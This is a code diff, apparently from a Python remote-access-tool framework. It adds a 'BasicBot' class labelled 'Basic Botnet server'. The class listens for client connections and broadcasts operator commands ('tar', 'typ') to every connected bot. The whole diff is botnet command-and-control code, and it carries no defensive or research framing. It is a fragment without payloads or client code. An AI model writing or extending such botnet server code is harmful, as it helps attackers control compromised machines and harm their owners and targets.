@@ -177,4 +177,42 @@ class BasicRat(AdvTemplate):
         config["INFO_SERV"] = self.INFO_SERV
         return config
     
+
+class BasicBot(BasicTemplate):
+    SERV_TYPE = "BasicBot"
+    INFO_SERV = "Basic Botnet server"
+
+    def __init__(self, main_pipe, **kwargs):
+        super().__init__(main_pipe, **kwargs)
+
+    def show_config(self):
+        config = super()._show_config()
+        config["SERV_TYPE"] = self.SERV_TYPE
+        config["INFO_SERV"] = self.INFO_SERV
+        return config
+    
+
+
+
+    def ACCEPT_CONN(self, handler):
+        acc_conn = Thread(target=self._listen_for_msg, args=(handler, ), daemon=True)
+        acc_conn.start()
+    
+    def _unpack_command(self, command):
+        cmd = []
+        for c in command.split(" "):
+            if c == "":
+                continue
+            cmd.append(c)
+        return cmd
+    
+    def base_command(self, cmd):
+        cmd = self._unpack_command(cmd)
+        self.Msg(f"CMD: {cmd}")
+        if cmd[0] == "tar":
+            self.Msg(f"[{self.name}] Send message to all clients")
+            self._send_msg_toall(f"tar {cmd[1]}")
+        elif cmd[0] == "typ":
+            self._send_msg_toall(f"typ {cmd[1]}")
+        
     
